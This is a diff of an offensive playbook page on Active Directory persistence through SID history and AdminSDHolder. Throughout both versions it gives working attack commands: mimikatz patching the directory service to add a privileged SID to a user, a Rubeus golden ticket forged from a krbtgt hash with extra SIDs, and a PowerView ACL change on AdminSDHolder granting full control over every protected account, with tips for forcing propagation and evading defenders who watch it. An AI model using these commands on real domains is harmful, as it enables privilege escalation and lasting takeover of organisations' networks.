@@ -1,32 +1,40 @@
-# SID History + AdminSDHolder
+# SID history and AdminSDHolder
 
-## SID History — detect
+## SID history: find it
+With PowerView loaded, as in :Pb domain-enum:
 Get-DomainUser -Properties sidhistory | ?{$_.sidhistory}
 Get-DomainGroup -Properties sidhistory | ?{$_.sidhistory}
-- [ ] Non-empty sidHistory in a single-domain forest = planted persistence or a migration leftover
-- [ ] Cross-forest: sidHistory containing the parent domain's privileged SIDs = instant escalation
+- [ ] A sidHistory in a forest with one domain: planted persistence, or left from a migration
+- [ ] Across domains: a sidHistory that holds the parent domain's privileged SIDs is that privilege, at once
 
-## SID History — abuse (needs DA or DS-Install-Replica-level access)
-mimikatz misc::addsid '<ChildDomain>\<User>' '<ParentDomain>\Domain Admins'
-.\Rubeus.exe golden /rc4:<krbtgtHash> /domain:<Domain> /sid:<DomainSID> /sids:<PrivilegedSID> /user:<User> /ptt
-- [ ] ExtraSids in a golden ticket = same effect without touching the account: :Pb golden-silver
-- [ ] SID filtering (trust quarantine) blocks foreign SIDs on external trusts — check the trust type first
+## SID history: use it
+- [ ] It takes a domain administrator: mimikatz patches the directory service on the DC itself
+At the pwn-broker prompt:
+tool install mimikatz
+serve
+serve files mimikatz
+On the DC, with THE-PRIVILEGED-SID such as the parent domain's Enterprise Admins:
+- [ ] mimikatz.exe fetched with the line serve files gives
+.\mimikatz.exe "privilege::debug" "sid::patch" "sid::add /sam:<TargetUser> /new:THE-PRIVILEGED-SID" "exit"
+The same effect with no change to the account, as extra SIDs in a golden ticket, with Rubeus from tool install rubeus and serve files rubeus, as in :Pb golden-silver:
+.\Rubeus.exe golden /rc4:THE-KRBTGT-HASH /domain:<Domain> /sid:<DomainSID> /sids:THE-PRIVILEGED-SID /user:<Username> /ptt
+- [ ] SID filtering, on an external or quarantined trust, drops foreign SIDs: the trust's type checked first
 
-## AdminSDHolder — enumerate
-Get-DomainObject -Identity 'CN=AdminSDHolder,CN=System,<DomainDN>' -Properties *
-Get-DomainObjectACL -Identity 'CN=AdminSDHolder,CN=System,<DomainDN>' -ResolveGUIDs
-- [ ] Every 60 min SDProp stamps this ACL onto all protected accounts (DA, EA, Schema Admins, Operators...)
-- [ ] Count=0 acl on protected users but not here = defenders cleaned the wrong place
+## AdminSDHolder: read it
+Get-DomainObject -Identity 'CN=AdminSDHolder,CN=System,<BaseDN>' -Properties *
+Get-DomainObjectAcl -Identity 'CN=AdminSDHolder,CN=System,<BaseDN>' -ResolveGUIDs
+- [ ] Every 60 minutes SDProp copies this ACL onto every protected account: Domain Admins, Enterprise Admins, Schema Admins, the Operators groups and the rest
+- [ ] An ACL cleaned on the protected users but not here means the defenders cleaned the wrong place
 
-## AdminSDHolder — backdoor
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<DomainDN>' -PrincipalIdentity <MyUser> -Rights All -Verbose
-- [ ] Wait ≤ 60 min → GenericAll on every protected account in the domain
-- [ ] Trigger now: Invoke-ADSDPropagation (or Set-ADObject trick) on Server 2016+
+## AdminSDHolder: a back door
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,<BaseDN>' -PrincipalIdentity '<Username>' -Rights All -Verbose
+- [ ] Within 60 minutes <Username> has GenericAll on every protected account in the domain
+- [ ] Sooner: SDProp started by hand on the PDC emulator, through the rootDSE operation RunProtectAdminGroupsTask
 
 ## If it fails
-- [ ] addsid errors = SID filtering or insufficient rights on the account object
-- [ ] SDProp reverts my change = defender tooling watches AdminSDHolder — quieter: ACL a single high-value protected user instead: :Pb acl-abuse
+- [ ] sid::add errors: SID filtering, or not enough rights over the account
+- [ ] SDProp puts my change back: something watches AdminSDHolder, so an ACL on one protected user that matters, which is quieter: :Pb acl-abuse
 
 ## Next
-- [ ] Privileged ticket in hand → DCSync: :Pb golden-silver
-- [ ] Full ACL methodology for the edges I found: :Pb acl-abuse
+- [ ] A privileged ticket: :Pb dcsync
+- [ ] The rest of the ACL edges I found: :Pb acl-abuse
